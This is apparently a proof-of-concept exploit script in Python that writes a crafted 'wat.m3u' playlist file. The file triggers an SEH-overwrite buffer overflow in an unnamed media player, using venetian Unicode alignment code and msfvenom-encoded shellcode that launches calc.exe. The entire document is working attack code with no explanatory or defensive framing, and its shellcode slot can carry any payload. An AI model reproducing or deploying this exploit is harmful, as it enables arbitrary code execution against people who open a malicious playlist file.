file = "wat.m3u"

offset	= "A" * 536		# offset before nSEH overwrite
nSEH	= "\x61\x41"		# POPAD + NOP/ALIGN
SEH		= "\xF2\x41"	# 0x004c0020 (POP POP RET)

venetian = "\x90"
venetian += "\x6e"
venetian += "\x05\x14\x11"	# ADD EAX,0x11001400 -\
venetian += "\x6e"		# ALIGN			|> +100
venetian += "\x2d\x13\x11"	# SUB EAX,0x11001300 -/
venetian += "\x6e"		# ALIGN

# this will serve as our jumpcode
venetian += "\x50"		# PUSH EAX
venetian += "\x6e"		# ALIGN
venetian += "\xc3"		# RET

padding	= "\x90" * 111

# msfvenom -a x86 --platform windows -p windows/exec CMD=calc.exe
# -e x86/unicode_mixed BufferRegister=EAX -f python -b "\x0a" -v buffer
buffer =  ""
buffer += "\x50\x50\x59\x41\x49\x41\x49\x41\x49\x41\x49\x41"
buffer += "\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41"
buffer += "\x49\x41\x49\x41\x49\x41\x49\x41\x6a\x58\x41\x51"
buffer += "\x41\x44\x41\x5a\x41\x42\x41\x52\x41\x4c\x41\x59"
buffer += "\x41\x49\x41\x51\x41\x49\x41\x51\x41\x49\x41\x68"
buffer += "\x41\x41\x41\x5a\x31\x41\x49\x41\x49\x41\x4a\x31"
buffer += "\x31\x41\x49\x41\x49\x41\x42\x41\x42\x41\x42\x51"
buffer += "\x49\x31\x41\x49\x51\x49\x41\x49\x51\x49\x31\x31"
buffer += "\x31\x41\x49\x41\x4a\x51\x59\x41\x5a\x42\x41\x42"
buffer += "\x41\x42\x41\x42\x41\x42\x6b\x4d\x41\x47\x42\x39"
buffer += "\x75\x34\x4a\x42\x69\x6c\x57\x78\x65\x32\x6d\x30"
buffer += "\x59\x70\x69\x70\x6f\x70\x74\x49\x47\x75\x4e\x51"
buffer += "\x35\x70\x72\x44\x42\x6b\x70\x50\x50\x30\x62\x6b"
buffer += "\x50\x52\x6c\x4c\x42\x6b\x4f\x62\x4b\x64\x32\x6b"
buffer += "\x52\x52\x4f\x38\x5a\x6f\x77\x47\x6f\x5a\x4d\x56"
buffer += "\x70\x31\x79\x6f\x76\x4c\x6d\x6c\x61\x51\x51\x6c"
buffer += "\x69\x72\x4c\x6c\x6b\x70\x35\x71\x66\x6f\x6c\x4d"
buffer += "\x7a\x61\x47\x57\x49\x52\x69\x62\x6f\x62\x31\x47"
buffer += "\x32\x6b\x50\x52\x6a\x70\x64\x4b\x4f\x5a\x6d\x6c"
buffer += "\x44\x4b\x70\x4c\x7a\x71\x30\x78\x37\x73\x6e\x68"
buffer += "\x4b\x51\x4a\x31\x72\x31\x72\x6b\x6f\x69\x6b\x70"
buffer += "\x59\x71\x48\x53\x44\x4b\x70\x49\x4e\x38\x79\x53"
buffer += "\x4c\x7a\x4d\x79\x32\x6b\x4f\x44\x44\x4b\x49\x71"
buffer += "\x66\x76\x4c\x71\x59\x6f\x64\x6c\x39\x31\x56\x6f"
buffer += "\x6a\x6d\x6b\x51\x67\x57\x30\x38\x57\x70\x34\x35"
buffer += "\x79\x66\x6b\x53\x71\x6d\x4b\x48\x6d\x6b\x63\x4d"
buffer += "\x6f\x34\x62\x55\x57\x74\x72\x38\x52\x6b\x4f\x68"
buffer += "\x4f\x34\x79\x71\x67\x63\x43\x36\x52\x6b\x4c\x4c"
buffer += "\x6e\x6b\x72\x6b\x30\x58\x4b\x6c\x6d\x31\x66\x73"
buffer += "\x34\x4b\x49\x74\x64\x4b\x5a\x61\x46\x70\x45\x39"
buffer += "\x30\x44\x4e\x44\x6d\x54\x31\x4b\x71\x4b\x33\x31"
buffer += "\x52\x39\x31\x4a\x52\x31\x79\x6f\x69\x50\x6f\x6f"
buffer += "\x61\x4f\x4e\x7a\x42\x6b\x4e\x32\x5a\x4b\x44\x4d"
buffer += "\x61\x4d\x52\x4a\x5a\x61\x64\x4d\x61\x75\x58\x32"
buffer += "\x6b\x50\x69\x70\x4b\x50\x6e\x70\x33\x38\x4d\x61"
buffer += "\x64\x4b\x62\x4f\x54\x47\x69\x6f\x37\x65\x57\x4b"
buffer += "\x58\x70\x44\x75\x73\x72\x61\x46\x71\x58\x36\x46"
buffer += "\x74\x55\x45\x6d\x35\x4d\x4b\x4f\x68\x55\x4d\x6c"
buffer += "\x4a\x66\x33\x4c\x4b\x5a\x61\x70\x49\x6b\x39\x50"
buffer += "\x61\x65\x6b\x55\x67\x4b\x4e\x67\x6a\x73\x34\x32"
buffer += "\x42\x4f\x30\x6a\x4d\x30\x42\x33\x59\x6f\x77\x65"
buffer += "\x61\x53\x53\x31\x32\x4c\x4f\x73\x4e\x4e\x31\x55"
buffer += "\x71\x68\x50\x65\x79\x70\x41\x41"

rest = "\x90" * (5000-len(padding))

payload = offset + nSEH + SEH + venetian + padding + buffer + rest

fd = open(file, 'w')
fd.write(payload)
fd.close()
